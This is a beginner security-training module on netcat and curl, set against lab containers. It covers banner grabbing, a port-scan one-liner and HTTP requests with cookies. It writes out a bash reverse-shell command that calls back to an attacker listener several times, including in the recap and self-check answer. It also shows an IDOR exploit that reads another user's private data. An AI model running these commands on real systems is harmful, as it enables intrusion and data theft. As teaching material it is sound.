# 03-3 · netcat & curl

> **Level:** Beginner · **Prerequisites:** [03-2 Wireshark & tcpdump](02_wireshark_and_tcpdump.md)
> **Time:** ~1.5 hours · **Verified:** 2026-06-25 (netcat-traditional, curl 8.x)

> ⚠️ **LEGAL REMINDER:** Use against lab containers only.

---

## Why this matters

netcat is called the "Swiss Army knife of networking" — it can connect to anything, listen for anything, and pipe data through anything. curl is how you craft and send HTTP requests from the command line. Both are essential daily tools.

---

## netcat: basic usage

```bash
# Connect to a port (like SSH to a TCP port)
nc 10.0.0.30 5000

# Listen on a port (wait for incoming connections)
nc -l -p 9999

# Port scan (one-liner)
nc -zv 10.0.0.20 70-90 2>&1 | grep succeeded
```

### Read a service banner

```bash
echo "" | nc -w 2 10.0.0.20 80
```

Output:
```
HTTP/1.1 400 Bad Request
Date: Wed, 25 Jun 2026 12:00:00 GMT
Server: Apache/2.4.57 (Debian)
```

The `Server` header reveals Apache 2.4.57 — check for CVEs.

---

## netcat: reverse shell (concept)

A **reverse shell** is when the victim machine connects back to your attacker, giving you a shell. It bypasses inbound firewall rules (the connection goes out, not in).

```bash
# Attacker — listen for incoming connection
nc -lvnp 4444

# Victim (if you had code execution — e.g., via command injection)
bash -i >& /dev/tcp/10.0.0.10/4444 0>&1
```

The victim's bash connects to the attacker on port 4444. The attacker now has a shell on the victim machine. This is demonstrated in Section 04.

---

## curl: HTTP from the command line

You've already used curl. Here's the full toolkit:

```bash
# GET
curl http://10.0.0.30:5000/

# POST with JSON
curl -X POST http://10.0.0.30:5000/login \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":"admin123"}'

# POST with form data (like a web form submission)
curl -X POST http://10.0.0.20/login.php \
  -d "username=admin&password=password&Login=Login"

# Send a custom header
curl -H "X-Custom-Header: test" http://10.0.0.30:5000/

# Follow redirects
curl -L http://10.0.0.20/

# Save cookies and reuse them
curl -c /tmp/cookies.txt -X POST http://10.0.0.30:5000/login \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":"admin123"}'
curl -b /tmp/cookies.txt http://10.0.0.30:5000/admin
```

---

## Verified output: IDOR via curl

```bash
# Login as alice
curl -s -c /tmp/lab_cookies.txt \
  -X POST http://localhost:5001/login \
  -H "Content-Type: application/json" \
  -d '{"username":"alice","password":"alice2024"}'

# Access admin's profile (IDOR — no auth check)
curl -s -b /tmp/lab_cookies.txt http://localhost:5001/user/1/profile
```

```json
{
    "email": "admin@lab.local",
    "id": 1,
    "notes": ["Admin secret: deploy key is gh_pat_XXXXXXXXXXXX"],
    "role": "admin",
    "username": "admin"
}
```

You're logged in as alice but reading admin's private notes. This is IDOR — exploited in depth in Module 05-6.

---

## Recap & next

- ✅ `nc host port` connects; `nc -lvnp PORT` listens
- ✅ Reading service banners: `echo "" | nc -w 2 host port`
- ✅ A reverse shell is `bash -i >& /dev/tcp/attacker/port 0>&1` — victim calls home
- ✅ curl with `-c`/`-b` handles cookies; `-H` sends custom headers; `-d` sends a body

**Self-check:** You get command injection on a web app. What netcat command do you run on your attacker machine to catch the reverse shell?

<details>
<summary>Answer</summary>

```bash
nc -lvnp 4444
```

`-l` listen, `-v` verbose, `-n` no DNS resolution, `-p 4444` on port 4444. Then inject: `bash -i >& /dev/tcp/10.0.0.10/4444 0>&1` on the victim.

</details>

---

## Exercise

**Banner grabbing sweep.** Write a bash one-liner that connects to ports 22, 80, 443, 5000 on `10.0.0.20` and `10.0.0.30`, reads the banner, and prints which ports responded.

<details>
<summary>Solution</summary>

```bash
for host in 10.0.0.20 10.0.0.30; do
  for port in 22 80 443 5000; do
    banner=$(echo "" | nc -w 1 "$host" "$port" 2>/dev/null | head -1)
    if [ -n "$banner" ]; then
      echo "$host:$port → $banner"
    fi
  done
done
```

</details>

---

**Next → [04 Burp Suite basics](04_burp_suite_basics.md)**
